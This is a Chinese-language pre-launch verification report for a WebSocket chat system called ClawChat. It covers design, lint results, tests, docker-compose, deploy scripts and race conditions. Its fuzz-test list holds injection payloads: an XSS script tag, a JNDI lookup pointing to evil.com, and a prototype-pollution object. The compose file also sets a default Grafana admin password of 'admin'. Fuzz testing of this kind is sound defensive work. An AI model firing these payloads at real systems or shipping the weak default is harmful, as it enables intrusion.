# ClawChat 上线前完整验证报告

## 1. 设计评审

### 1.1 状态机图（文字描述）

#### 客户端状态机
```
                    ┌─────────────────────────────────────────────────────────────┐
                    │                                                             │
                    ▼                                                             │
┌──────────────┐   connect()   ┌──────────────┐   收到welcome   ┌──────────────┐ │
│ disconnected │ ─────────────▶ │  connecting  │ ───────────────▶ │  connected   │ │
└──────────────┘                └──────────────┘                 └──────────────┘ │
     ▲                    │            │                              │            │
     │                    │            │ 连接失败/超时                   │ send register
     │                    │            ▼                              ▼            │
     │                    │      ┌──────────────┐                 ┌──────────────┐  │
     │                    └─────▶│ disconnected │◀────────────────│  registered  │  │
     │                           └──────────────┘   close/断开      └──────────────┘  │
     │                                                           收到registered     │
     │                                                                               │
     └───────────────────────────────────────────────────────────────────────────────┘
                              autoReconnect=true时自动重连

状态说明：
- disconnected: 初始状态，未连接或连接已断开
- connecting: 正在建立WebSocket连接
- connected: WebSocket连接已建立，等待注册确认
- registered: 已注册成功，可以收发消息

状态转换触发条件：
1. disconnected → connecting: 调用connect()
2. connecting → connected: WebSocket连接成功建立
3. connecting → disconnected: 连接超时或失败
4. connected → registered: 发送register消息并收到registered响应
5. connected → disconnected: 连接断开
6. registered → disconnected: 连接断开或收到close事件
7. disconnected → connecting: 自动重连(autoReconnect=true)
```

#### 服务器状态机
```
┌──────────────┐   WebSocket连接   ┌──────────────┐   收到register   ┌──────────────┐
│   (none)     │ ────────────────▶ │  connection  │ ───────────────▶ │  registered  │
└──────────────┘                   └──────────────┘                  └──────────────┘
                                          │                              │
                                          │ 30秒超时/断开                 │ 收到subscribe
                                          ▼                              ▼
                                   ┌──────────────┐              ┌──────────────┐
                                   │  disconnected│              │  subscribed  │
                                   └──────────────┘              └──────────────┘
                                                                         │
                                                                         │ 取消订阅/断开
                                                                         ▼
                                                                  ┌──────────────┐
                                                                  │  registered  │
                                                                  └──────────────┘

状态说明：
- connection: WebSocket连接已建立，等待客户端注册
- registered: 客户端已完成注册，分配了ID
- subscribed: 客户端已订阅至少一个频道
- disconnected: 连接已断开，清理资源

状态转换触发条件：
1. (none) → connection: 新的WebSocket连接
2. connection → registered: 收到有效的register消息
3. connection → disconnected: 30秒内未注册或连接断开
4. registered → subscribed: 收到有效的subscribe消息
5. subscribed → registered: 取消所有订阅
6. registered/disconnected → disconnected: 连接断开
```

### 1.2 JSON Schema消息契约

#### 客户端 → 服务器消息

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "definitions": {
    "register": {
      "type": "object",
      "required": ["type", "id"],
      "properties": {
        "type": { "const": "register" },
        "id": { "type": "string", "minLength": 1, "maxLength": 32 },
        "timestamp": { "type": "integer" }
      }
    },
    "subscribe": {
      "type": "object",
      "required": ["type", "channel"],
      "properties": {
        "type": { "const": "subscribe" },
        "channel": { "type": "string", "minLength": 1, "maxLength": 64 },
        "timestamp": { "type": "integer" }
      }
    },
    "publish": {
      "type": "object",
      "required": ["type", "channel", "payload"],
      "properties": {
        "type": { "const": "publish" },
        "channel": { "type": "string", "minLength": 1, "maxLength": 64 },
        "payload": { "type": "object" },
        "timestamp": { "type": "integer" }
      }
    },
    "ping": {
      "type": "object",
      "required": ["type"],
      "properties": {
        "type": { "const": "ping" },
        "timestamp": { "type": "integer" }
      }
    },
    "ack": {
      "type": "object",
      "required": ["type", "msgId"],
      "properties": {
        "type": { "const": "ack" },
        "msgId": { "type": "string" },
        "timestamp": { "type": "integer" }
      }
    }
  }
}
```

#### 服务器 → 客户端消息

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "definitions": {
    "welcome": {
      "type": "object",
      "required": ["type", "clientId"],
      "properties": {
        "type": { "const": "welcome" },
        "clientId": { "type": "string", "format": "uuid" },
        "timestamp": { "type": "integer" }
      }
    },
    "registered": {
      "type": "object",
      "required": ["type", "id"],
      "properties": {
        "type": { "const": "registered" },
        "id": { "type": "string" },
        "channels": { "type": "array", "items": { "type": "string" } },
        "timestamp": { "type": "integer" }
      }
    },
    "subscribed": {
      "type": "object",
      "required": ["type", "channel"],
      "properties": {
        "type": { "const": "subscribed" },
        "channel": { "type": "string" },
        "members": { "type": "array", "items": { "type": "string" } },
        "timestamp": { "type": "integer" }
      }
    },
    "message": {
      "type": "object",
      "required": ["type", "msgId", "channel", "from", "payload"],
      "properties": {
        "type": { "const": "message" },
        "msgId": { "type": "string", "format": "uuid" },
        "channel": { "type": "string" },
        "from": { "type": "string" },
        "payload": { "type": "object" },
        "timestamp": { "type": "integer" }
      }
    },
    "pong": {
      "type": "object",
      "required": ["type"],
      "properties": {
        "type": { "const": "pong" },
        "timestamp": { "type": "integer" }
      }
    },
    "error": {
      "type": "object",
      "required": ["type", "error"],
      "properties": {
        "type": { "const": "error" },
        "error": { "type": "string" },
        "timestamp": { "type": "integer" }
      }
    },
    "member_joined": {
      "type": "object",
      "required": ["type", "channel", "member"],
      "properties": {
        "type": { "const": "member_joined" },
        "channel": { "type": "string" },
        "member": { "type": "string" },
        "members": { "type": "array", "items": { "type": "string" } },
        "timestamp": { "type": "integer" }
      }
    },
    "member_left": {
      "type": "object",
      "required": ["type", "channel", "member"],
      "properties": {
        "type": { "const": "member_left" },
        "channel": { "type": "string" },
        "member": { "type": "string" },
        "members": { "type": "array", "items": { "type": "string" } },
        "timestamp": { "type": "integer" }
      }
    }
  }
}
```

### 1.3 并发临界区清单

| 序号 | 文件 | 位置 | 临界资源 | 风险等级 | 说明 |
|------|------|------|----------|----------|------|
| 1 | server.js:12-15 | 全局 | clients, clientById, channels, messages, pendingACK | 🔴 高 | 所有客户端共享的全局Map，所有操作都是临界区 |
| 2 | server.js:57-66 | connection事件 | clients | 🟡 中 | 新连接时写入clients Map |
| 3 | server.js:186-190 | handleRegister | clientById, client.id | 🔴 高 | ID注册需要原子性检查+写入 |
| 4 | server.js:207-221 | handleSubscribe | channels, client.channels | 🔴 高 | 订阅操作涉及两个Map的修改 |
| 5 | server.js:250-260 | handlePublish | messages, pendingACK | 🔴 高 | 消息发布涉及消息存储和ACK追踪 |
| 6 | server.js:289-309 | broadcastToChannel | channels | 🟡 中 | 遍历频道成员时可能被修改 |
| 7 | server.js:362-396 | cleanupClient | clients, clientById, channels, pendingACK | 🔴 高 | 清理操作涉及多个Map的修改 |
| 8 | server.js:430-444 | 心跳检查 | clients | 🟡 中 | 遍历clients时可能被修改 |
| 9 | client.js:15-22 | 构造函数 | 所有实例属性 | 🟢 低 | 单线程构造，无并发问题 |
| 10 | client.js:30-90 | connect() | this.ws, timers | 🟡 中 | WebSocket连接状态管理 |
| 11 | client.js:165-170 | send() | this.messageQueue | 🟡 中 | 消息队列的读写 |
| 12 | client.js:173-183 | flushQueue() | this.messageQueue | 🟡 中 | 刷新队列时的读写 |
| 13 | client.js:196-200 | publish() | this.pendingMessages | 🟡 中 | 待确认消息Map的修改 |

**关键发现：**
- 服务器端所有全局Map操作都是潜在的竞态条件点
- Node.js是单线程的，但异步I/O可能导致回调交错执行
- 缺少显式的锁机制保护共享状态

## 2. 静态分析

### 2.1 ESLint结果

```
✖ 39 problems (39 errors, 0 warnings)

错误分类：
1. no-use-before-define: 15个错误
   - server.js中大量函数在使用后才定义
   - sendError, handleMessage, cleanupClient等

2. curly (缺少花括号): 22个错误
   - server.js:22-23, 138, 179, 312, 341-344, 361, 395, 412, 418, 421, 440
   - client.js:192

3. no-unused-vars: 2个错误
   - server.js:508:16 'err' is defined but never used
   - server.js:529:15 'clientId' is assigned a value but never used
```

**修复建议：**
1. 将函数定义移到文件顶部或使用函数声明提升
2. 所有if语句添加花括号
3. 删除未使用的变量或使用它们

### 2.2 依赖分析

#### 服务器依赖 (package.json)
```json
{
  "uuid": "^9.0.0",      // 生成唯一ID
  "ws": "^8.14.2"        // WebSocket实现
}
```

#### 客户端依赖
```javascript
const WebSocket = require('ws');      // 需要安装ws包
const EventEmitter = require('events'); // Node.js内置
```

**依赖问题：**
1. client.js依赖`ws`包，但没有package.json声明
2. 没有package-lock.json锁定版本
3. 缺少运行时依赖检查

#### 导入/导出分析

**server.js:**
- require('ws') ✓
- require('http') ✓ (内置)
- require('uuid') ✓

**client.js:**
- require('ws') ✗ (未声明依赖)
- require('events') ✓ (内置)

**潜在循环引用：**
- 未发现client.js和server.js之间的循环引用
- 两个模块独立，无相互依赖

### 2.3 测试骨架

基于代码分支生成测试用例：

#### server.js测试骨架

```javascript
describe('ClawChat Server', () => {
  describe('Connection', () => {
    it('should accept new WebSocket connections');
    it('should send welcome message on connect');
    it('should close connection after 30s if not registered');
    it('should reject connections exceeding max payload');
  });

  describe('Registration', () => {
    it('should register with valid ID (1-32 chars)');
    it('should reject empty ID');
    it('should reject ID > 32 chars');
    it('should reject duplicate ID');
    it('should allow re-registration with same ID');
    it('should send registered confirmation');
  });

  describe('Subscribe', () => {
    it('should reject subscribe from unregistered client');
    it('should subscribe to valid channel (1-64 chars)');
    it('should reject empty channel name');
    it('should reject channel > 64 chars');
    it('should broadcast member_joined to channel');
    it('should maintain channel membership list');
  });

  describe('Publish', () => {
    it('should reject publish from unregistered client');
    it('should reject publish to unsubscribed channel');
    it('should reject payload > 10KB');
    it('should broadcast message to channel members');
    it('should generate unique msgId');
    it('should track pending ACK');
    it('should retry delivery up to 3 times');
    it('should send ACK to publisher');
  });

  describe('Heartbeat', () => {
    it('should respond to ping with pong');
    it('should disconnect after 150s without heartbeat');
    it('should update lastHeartbeat on any message');
  });

  describe('Cleanup', () => {
    it('should remove client from all channels on disconnect');
    it('should broadcast member_left on disconnect');
    it('should delete empty channels');
    it('should clear pending ACKs on disconnect');
    it('should allow graceful shutdown');
  });
});
```

#### client.js测试骨架

```javascript
describe('ClawChat Client', () => {
  describe('Connection', () => {
    it('should connect to server');
    it('should handle connection timeout');
    it('should auto-reconnect on disconnect');
    it('should implement exponential backoff');
    it('should respect maxReconnectDelay');
  });

  describe('Registration', () => {
    it('should auto-register after connection');
    it('should emit registered event');
    it('should handle registration failure');
  });

  describe('Subscribe', () => {
    it('should subscribe to channel');
    it('should re-subscribe after reconnection');
    it('should track subscribed channels');
  });

  describe('Publish', () => {
    it('should publish message to channel');
    it('should queue messages when offline');
    it('should flush queue on reconnect');
    it('should track pending messages');
    it('should generate unique msgId');
  });

  describe('Receive', () => {
    it('should emit message events');
    it('should auto-send ACK for messages');
    it('should handle server errors');
  });

  describe('Heartbeat', () => {
    it('should send ping every 30s');
    it('should handle pong response');
  });

  describe('Disconnection', () => {
    it('should clean up on disconnect()');
    it('should stop auto-reconnect when disabled');
    it('should clear all timers');
  });
});
```

## 3. 边界与异常测试

### 3.1 边界测试用例表

| 模块 | 测试项 | 边界值 | 预期结果 |
|------|--------|--------|----------|
| 注册 | ID长度下限 | "" (空字符串) | 拒绝，返回错误 |
| 注册 | ID长度上限 | 32个字符 | 接受 |
| 注册 | ID长度超限 | 33个字符 | 拒绝，返回错误 |
| 注册 | ID类型 | null/undefined/number | 拒绝，返回错误 |
| 订阅 | 频道名长度下限 | "" (空字符串) | 拒绝，返回错误 |
| 订阅 | 频道名长度上限 | 64个字符 | 接受 |
| 订阅 | 频道名长度超限 | 65个字符 | 拒绝，返回错误 |
| 消息 | Payload大小 | 10KB | 接受 |
| 消息 | Payload大小 | 10KB + 1字节 | 拒绝，返回错误 |
| 消息 | Payload类型 | null/undefined | 根据处理逻辑 |
| 心跳 | 注册超时 | 30秒 | 断开连接 |
| 心跳 | 心跳超时 | 150秒 | 断开连接 |
| 重连 | 退避延迟 | 1秒 → 60秒 | 指数增长，封顶60秒 |
| 重试 | ACK重试次数 | 3次 | 放弃消息 |
| 并发 | 客户端数量 | 内存限制 | 稳定运行 |
| 内存 | 消息存储 | 10分钟后 | 自动清理 |

### 3.2 故障注入场景

#### 网络故障
```javascript
describe('Network Failure Scenarios', () => {
  it('should handle connection timeout (server not responding)', async () => {
    // 模拟服务器不响应SYN包
  });

  it('should handle connection reset during handshake', async () => {
    // 在WebSocket握手期间断开
  });

  it('should handle connection drop after established', async () => {
    // 连接建立后网络断开
  });

  it('should handle partial message delivery', async () => {
    // TCP分段，消息被拆分
  });

  it('should handle message corruption', async () => {
    // 数据包损坏（需校验和层检测）
  });

  it('should handle high latency (>5s)', async () => {
    // 网络延迟导致ACK超时
  });

  it('should handle packet reordering', async () => {
    // 消息到达顺序错乱
  });
});
```

#### 服务器故障
```javascript
describe('Server Failure Scenarios', () => {
  it('should handle server crash during message processing', async () => {
    // 服务器崩溃，客户端应检测到断开并重连
  });

  it('should handle graceful server shutdown', async () => {
    // 服务器优雅关闭，应发送close帧
  });

  it('should handle server resource exhaustion', async () => {
    // 服务器内存/CPU耗尽
  });

  it('should handle server restart', async () => {
    // 服务器重启后客户端自动重连
  });
});
```

#### 客户端故障
```javascript
describe('Client Failure Scenarios', () => {
  it('should handle client crash during publish', async () => {
    // 客户端崩溃，服务器应清理资源
  });

  it('should handle rapid connect/disconnect cycles', async () => {
    // 客户端频繁重连
  });

  it('should handle multiple clients with same ID', async () => {
    // ID冲突场景
  });
});
```

#### 超时场景
```javascript
describe('Timeout Scenarios', () => {
  it('should timeout registration after 30s', async () => {
    // 客户端连接但不发送register
  });

  it('should timeout heartbeat after 150s', async () => {
    // 客户端停止发送ping
  });

  it('should timeout ACK after 5s and retry', async () => {
    // 消息发送后未收到ACK
  });

  it('should give up after 3 ACK retries', async () => {
    // 多次重试失败
  });
});
```

### 3.3 模糊测试策略

#### 输入模糊测试
```javascript
const fuzzInputs = {
  // 消息类型模糊
  messageTypes: [
    '', 'REGISTER', 'Register', 'register\x00', 
    'register' + 'a'.repeat(1000), null, undefined,
    123, {}, [], true
  ],
  
  // ID模糊
  ids: [
    '', 'a', 'a'.repeat(32), 'a'.repeat(33),
    '\x00', '\xFF', 'test\x00id', '   ',
    '<script>alert(1)</script>',
    '${jndi:ldap://evil.com}'
  ],
  
  // 频道名模糊
  channels: [
    '', 'a', 'a'.repeat(64), 'a'.repeat(65),
    '#general', '@user', 'channel/with/slash',
    'channel.with.dots', ' channel ', '\n\t'
  ],
  
  // Payload模糊
  payloads: [
    null, undefined, {}, [],
    'a'.repeat(10240), 'a'.repeat(10241),
    { circular: null }, // 循环引用
    { __proto__: { polluted: true } }, // 原型污染
    Buffer.alloc(10240).fill('A'), // 大Buffer
    JSON.parse('{"key": "value"}')
  ],
  
  // 消息ID模糊
  msgIds: [
    '', 'invalid', '550e8400-e29b-41d4-a716-446655440000',
    'not-a-uuid', null, 12345
  ]
};

describe('Fuzz Testing', () => {
  it('should handle random message types gracefully', () => {
    for (const type of fuzzInputs.messageTypes) {
      // 发送模糊类型，不应崩溃
    }
  });

  it('should handle malformed JSON', () => {
    const malformed = [
      '{', '}', '[]', '[', 
      '{type: "register"}', // 无效JSON
      '{"type": "register",}', // 尾随逗号
      '{"type": "register"' // 未闭合
    ];
  });

  it('should handle binary data', () => {
    // 发送非UTF8数据
    const binary = Buffer.from([0xFF, 0xFE, 0x00, 0x01]);
  });

  it('should handle extremely large messages', () => {
    // 超过maxPayload的消息
    const huge = 'x'.repeat(1024 * 1024);
  });

  it('should handle rapid message flood', () => {
    // 短时间内发送大量消息
    for (let i = 0; i < 10000; i++) {
      client.send({ type: 'ping' });
    }
  });
});
```

## 4. 集成环境

### 4.1 docker-compose.yml

```yaml
version: '3.8'

services:
  clawchat-server:
    build:
      context: ./server
      dockerfile: Dockerfile
    ports:
      - "8080:8080"
    environment:
      - PORT=8080
      - NODE_ENV=production
      - HEARTBEAT_INTERVAL=30000
      - HEARTBEAT_TIMEOUT=150000
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:8080"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 5s
    restart: unless-stopped
    networks:
      - clawchat-network

  clawchat-client-1:
    build:
      context: ./client
      dockerfile: Dockerfile
    environment:
      - SERVER_URL=ws://clawchat-server:8080
      - CLIENT_ID=client-1
    depends_on:
      clawchat-server:
        condition: service_healthy
    networks:
      - clawchat-network
    profiles:
      - test

  clawchat-client-2:
    build:
      context: ./client
      dockerfile: Dockerfile
    environment:
      - SERVER_URL=ws://clawchat-server:8080
      - CLIENT_ID=client-2
    depends_on:
      clawchat-server:
        condition: service_healthy
    networks:
      - clawchat-network
    profiles:
      - test

  # Redis for horizontal scaling (future)
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis-data:/data
    networks:
      - clawchat-network
    profiles:
      - scaling

  # Monitoring
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
    networks:
      - clawchat-network
    profiles:
      - monitoring

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana-data:/var/lib/grafana
    networks:
      - clawchat-network
    profiles:
      - monitoring

networks:
  clawchat-network:
    driver: bridge

volumes:
  redis-data:
  grafana-data:
```

#### server/Dockerfile
```dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production

COPY server.js ./

EXPOSE 8080

USER node

CMD ["node", "server.js"]
```

#### client/Dockerfile
```dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production

COPY client.js ./

USER node

CMD ["node", "client.js"]
```

### 4.2 冒烟测试步骤

```bash
#!/bin/bash
# smoke-test.sh - 冒烟测试脚本

set -e

echo "=== ClawChat Smoke Test ==="

# 1. 环境检查
echo "[1/8] Checking environment..."
docker-compose --version
node --version

# 2. 启动服务
echo "[2/8] Starting services..."
docker-compose up -d clawchat-server
sleep 5

# 3. 健康检查
echo "[3/8] Health check..."
curl -sf http://localhost:8080 || (echo "Server not responding" && exit 1)
echo "✓ Server is healthy"

# 4. WebSocket连接测试
echo "[4/8] Testing WebSocket connection..."
npx wscat -c ws://localhost:8080 -x '{"type":"register","id":"smoke-test"}' --wait 2
echo "✓ WebSocket connection works"

# 5. 注册流程测试
echo "[5/8] Testing registration flow..."
node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://localhost:8080');
ws.on('open', () => {
  ws.send(JSON.stringify({type: 'register', id: 'test-client'}));
});
ws.on('message', (data) => {
  const msg = JSON.parse(data);
  console.log('Received:', msg.type);
  if (msg.type === 'registered') {
    console.log('✓ Registration successful');
    ws.close();
    process.exit(0);
  }
});
setTimeout(() => { console.log('✗ Timeout'); process.exit(1); }, 5000);
"

# 6. 订阅/发布测试
echo "[6/8] Testing subscribe/publish..."
node -e "
const WebSocket = require('ws');
const client1 = new WebSocket('ws://localhost:8080');
const client2 = new WebSocket('ws://localhost:8080');
let registered = 0;

function checkDone() {
  registered++;
  if (registered === 2) {
    client1.send(JSON.stringify({type: 'subscribe', channel: 'test'}));
    client2.send(JSON.stringify({type: 'subscribe', channel: 'test'}));
  }
}

client1.on('message', (data) => {
  const msg = JSON.parse(data);
  if (msg.type === 'welcome') checkDone();
  if (msg.type === 'subscribed') {
    client1.send(JSON.stringify({type: 'publish', channel: 'test', payload: {text: 'hello'}}));
  }
});

client2.on('message', (data) => {
  const msg = JSON.parse(data);
  if (msg.type === 'welcome') checkDone();
  if (msg.type === 'message') {
    console.log('✓ Message received:', msg.payload);
    client1.close();
    client2.close();
    process.exit(0);
  }
});

client1.on('open', () => client1.send(JSON.stringify({type: 'register', id: 'pub'})));
client2.on('open', () => client2.send(JSON.stringify({type: 'register', id: 'sub'})));

setTimeout(() => { console.log('✗ Timeout'); process.exit(1); }, 10000);
"

# 7. 心跳测试
echo "[7/8] Testing heartbeat..."
node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://localhost:8080');
let pongReceived = false;

ws.on('open', () => {
  ws.send(JSON.stringify({type: 'register', id: 'heartbeat-test'}));
  setTimeout(() => {
    ws.send(JSON.stringify({type: 'ping'}));
  }, 100);
});

ws.on('message', (data) => {
  const msg = JSON.parse(data);
  if (msg.type === 'pong') {
    console.log('✓ Heartbeat working');
    pongReceived = true;
    ws.close();
    process.exit(0);
  }
});

setTimeout(() => { 
  if (!pongReceived) { console.log('✗ Heartbeat timeout'); process.exit(1); }
}, 5000);
"

# 8. 压力测试
echo "[8/8] Running light pressure test..."
node -e "
const WebSocket = require('ws');
const clients = [];
const count = 50;
let connected = 0;

for (let i = 0; i < count; i++) {
  const ws = new WebSocket('ws://localhost:8080');
  ws.on('open', () => {
    ws.send(JSON.stringify({type: 'register', id: 'load-' + i}));
  });
  ws.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.type === 'registered') {
      connected++;
      if (connected === count) {
        console.log('✓ All', count, 'clients connected');
        clients.forEach(c => c.close());
        process.exit(0);
      }
    }
  });
  clients.push(ws);
}

setTimeout(() => { console.log('✗ Only', connected, 'connected'); process.exit(1); }, 30000);
"

echo ""
echo "=== All Smoke Tests Passed ==="

# 清理
docker-compose down
```

### 4.3 发布/回滚脚本

#### deploy.sh - 发布脚本
```bash
#!/bin/bash
# deploy.sh - 发布脚本

set -e

VERSION=${1:-latest}
IMAGE_PREFIX="your-registry.com/clawchat"

echo "=== Deploying ClawChat v${VERSION} ==="

# 1. 构建镜像
echo "[1/5] Building images..."
docker build -t ${IMAGE_PREFIX}/server:${VERSION} ./server
docker build -t ${IMAGE_PREFIX}/client:${VERSION} ./client

# 2. 测试镜像
echo "[2/5] Testing images..."
docker run --rm ${IMAGE_PREFIX}/server:${VERSION} node --version
docker run --rm ${IMAGE_PREFIX}/client:${VERSION} node --version

# 3. 推送镜像
echo "[3/5] Pushing images..."
docker push ${IMAGE_PREFIX}/server:${VERSION}
docker push ${IMAGE_PREFIX}/client:${VERSION}

# 4. 备份当前版本
echo "[4/5] Creating backup..."
kubectl get deployment clawchat-server -o yaml > backup-$(date +%Y%m%d-%H%M%S).yaml

# 5. 滚动更新
echo "[5/5] Rolling update..."
kubectl set image deployment/clawchat-server server=${IMAGE_PREFIX}/server:${VERSION}
kubectl rollout status deployment/clawchat-server --timeout=300s

echo "✓ Deployment complete"
```

#### rollback.sh - 回滚脚本
```bash
#!/bin/bash
# rollback.sh - 回滚脚本

set -e

echo "=== Rolling Back ClawChat ==="

# 1. 查看历史版本
echo "[1/3] Checking rollout history..."
kubectl rollout history deployment/clawchat-server

# 2. 执行回滚
echo "[2/3] Rolling back..."
kubectl rollout undo deployment/clawchat-server

# 3. 验证回滚
echo "[3/3] Verifying rollback..."
kubectl rollout status deployment/clawchat-server --timeout=300s
kubectl get pods -l app=clawchat-server

echo "✓ Rollback complete"
```

## 5. 形式化验证（简化版）

### 5.1 竞态条件清单

| 序号 | 位置 | 竞态条件描述 | 触发条件 | 后果 | 概率 |
|------|------|--------------|----------|------|------|
| 1 | server.js:186-190 | 并发注册相同ID | 两个客户端同时注册相同ID | 一个客户端注册失败或被覆盖 | 低 |
| 2 | server.js:207-221 | 订阅与清理并发 | 客户端订阅时断开连接 | 频道成员列表不一致 | 中 |
| 3 | server.js:250-260 | 发布与断开并发 | 发布消息时客户端断开 | pendingACK泄漏或重复发送 | 中 |
| 4 | server.js:362-396 | 清理与广播并发 | cleanup与broadcastToChannel同时执行 | 向已关闭连接发送消息 | 中 |
| 5 | server.js:430-444 | 心跳检查与清理并发 | 心跳检查遍历clients时cleanup执行 | 遍历期间Map被修改 | 低 |
| 6 | server.js:289-309 | 广播时成员断开 | broadcastToChannel执行期间成员断开 | 发送失败但不影响其他 | 低 |
| 7 | client.js:165-170 | send与disconnect并发 | 发送消息时调用disconnect | 消息丢失或异常 | 低 |
| 8 | client.js:30-90 | connect重入 | 连接过程中再次调用connect | 多个WebSocket实例 | 中 |

### 5.2 锁保护建议

#### 方案1: 使用async-mutex（推荐）

```javascript
const { Mutex } = require('async-mutex');

// 为每个关键资源创建锁
const clientsMutex = new Mutex();
const channelsMutex = new Mutex();
const pendingACKMutex = new Mutex();

// 示例：保护注册操作
async function handleRegister(clientId, msg) {
  const release = await clientsMutex.acquire();
  try {
    const client = clients.get(clientId);
    if (!client) return;
    
    const id = msg.id;
    // ... 注册逻辑
  } finally {
    release();
  }
}
```

#### 方案2: 使用Node.js的同步原语

```javascript
// 使用Atomics或更细粒度的锁
class Lock {
  constructor() {
    this.promise = Promise.resolve();
  }
  
  acquire() {
    let release;
    const newPromise = new Promise(resolve => {
      release = () => resolve();
    });
    const wait = this.promise;
    this.promise = this.promise.then(() => newPromise);
    return wait.then(() => release);
  }
}
```

#### 方案3: 使用事件队列串行化

```javascript
// 使用setImmediate确保操作串行执行
function safeOperation(operation) {
  return new Promise((resolve, reject) => {
    setImmediate(async () => {
      try {
        const result = await operation();
        resolve(result);
      } catch (err) {
        reject(err);
      }
    });
  });
}
```

#### 关键修改建议

1. **注册操作** (server.js:186-190)
```javascript
// 当前代码（有竞态）
const existingClientId = clientById.get(id);
if (existingClientId && existingClientId !== clientId) {
  sendError(client.ws, `ID ${id} already in use`);
  return;
}

// 建议：使用原子操作或锁
```

2. **清理操作** (server.js:362-396)
```javascript
// 当前代码在清理时可能被并发修改
// 建议：使用try-finally确保清理完成
// 或标记客户端为"正在清理"状态，拒绝新操作
```

3. **客户端connect方法** (client.js:30-90)
```javascript
// 添加连接状态锁
this.connecting = false;

connect() {
  if (this.connecting) return; // 防止重入
  this.connecting = true;
  // ... 连接逻辑
  this.connecting = false;
}
```

## 结论

### 是否可上线：❌ 需修复

### 关键风险点

| 优先级 | 风险 | 影响 | 修复建议 |
|--------|------|------|----------|
| 🔴 P0 | 39个ESLint错误 | 代码质量差，潜在bug | 修复所有lint错误 |
| 🔴 P0 | 竞态条件 | 数据不一致，崩溃 | 添加锁保护 |
| 🟡 P1 | 缺少客户端package.json | 依赖未声明 | 添加package.json |
| 🟡 P1 | 函数先使用后定义 | 可读性差，维护困难 | 重构代码结构 |
| 🟡 P1 | 缺少if花括号 | 易引入bug | 添加花括号 |
| 🟢 P2 | 缺少测试覆盖 | 无法验证功能 | 添加单元测试 |
| 🟢 P2 | 缺少日志级别控制 | 生产环境日志过多 | 添加日志库 |

### 建议的上线检查清单

#### 代码质量
- [ ] 所有ESLint错误已修复
- [ ] 代码审查通过
- [ ] 单元测试覆盖率 > 80%
- [ ] 集成测试通过

#### 功能验证
- [ ] 连接/断开流程正常
- [ ] 注册/订阅/发布流程正常
- [ ] 心跳机制工作正常
- [ ] 重连机制工作正常
- [ ] 消息ACK机制工作正常

#### 性能验证
- [ ] 支持1000+并发连接
- [ ] 消息延迟 < 100ms (P99)
- [ ] 内存使用稳定，无泄漏
- [ ] CPU使用正常

#### 安全验证
- [ ] 输入验证完善
- [ ] 消息大小限制有效
- [ ] 频率限制已实施
- [ ] 敏感信息未泄露

#### 运维准备
- [ ] 监控告警配置完成
- [ ] 日志收集配置完成
- [ ] 回滚方案验证通过
- [ ] 应急预案准备就绪

#### 文档
- [ ] API文档完整
- [ ] 部署文档完整
- [ ] 运维手册完整
- [ ] 故障排查指南完整

---

**建议修复时间：2-3天**
**建议上线时间：修复完成后 + 1天验证期**